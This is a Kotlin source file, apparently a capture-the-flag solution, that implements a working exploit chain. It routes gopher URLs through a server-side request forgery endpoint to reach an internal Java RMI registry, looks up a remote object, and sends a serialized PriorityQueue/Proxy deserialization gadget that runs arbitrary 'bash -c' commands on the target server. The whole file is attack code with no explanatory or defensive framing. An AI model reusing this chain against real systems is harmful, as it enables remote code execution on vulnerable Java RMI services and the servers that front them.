package soln

import com.yxxx.Gadget
import com.yxxx.UserInter
import org.joor.Reflect
import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import top.ceclin.jrmp.RegistryV1
import top.ceclin.jrmp.ext.jrmpHash
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.rmiCall
import top.ceclin.jrmp.request.singleOp
import top.ceclin.jrmp.response.Return
import java.lang.reflect.Proxy
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.rmi.server.RemoteObject
import java.util.*

class Soln(private val target: String) {

    private val liveRef = lookup()

    private fun lookup(name: String = "0ops", host: String = "rmiserver"): LiveRef {
        val request = RegistryV1.lookup { writeObject(name) }.singleOp().request()
        val response = send(redirectUrl(gopherUrl(host, 1099, request.value)))
        val proxy = Return.decode(response).stream.readObject()
        val remote = Proxy.getInvocationHandler(proxy) as RemoteObject
        val ref = remote.ref as UnicastRef
        return ref.liveRef.also(::println)
    }

    fun serverBash(bash: String, host: String = "rmiserver") {
        val method = UserInter::class.java.getMethod("sayHello", String::class.java)
        val request = rmiCall(liveRef.objID, method.jrmpHash) {
            writeObject(gadget(arrayOf("bash", "-c", bash)))
        }.singleOp().request()
        send(redirectUrl(gopherUrl(host, liveRef.port, request.value)))
    }

    private fun gadget(cmd: Array<String>): Any {
        val priorityQueue = PriorityQueue<Any>().apply { repeat(2) { add("") } }
        val array = Reflect.on(priorityQueue).get<Array<Any>>("queue")
        array[0] = Proxy.newProxyInstance(
            Thread.currentThread().contextClassLoader, arrayOf(Comparable::class.java), Gadget()
        )
        array[1] = cmd
        return priorityQueue
    }

    private fun send(url: String): ByteArray {
        val http = "$target?url=${URLEncoder.encode(url, "UTF-8")}"
        val connection = URL(http).openConnection() as HttpURLConnection
        val stream = with(connection) { if (responseCode < 400) inputStream else errorStream }
        return stream.readBytes()
    }
}
